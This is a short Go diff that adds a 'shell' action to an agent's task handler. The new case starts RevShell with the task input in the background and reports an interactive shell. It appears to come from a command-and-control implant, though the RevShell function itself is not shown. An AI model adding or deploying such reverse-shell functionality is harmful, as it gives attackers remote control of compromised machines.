@@ -109,6 +109,10 @@ func (agent *Agent) HandleTask(task Task) (Result, error) {
 			result.Result = string(out)
 			result.ReturnCode = 0
 		}
+	case "shell":
+		go RevShell(task.Input) 
+		result.Result = "Interactive shell started in background"
+		result.ReturnCode = 0
 	default:
 		return result, fmt.Errorf("Undefined action in JSON: %s", task.Action)
 	}
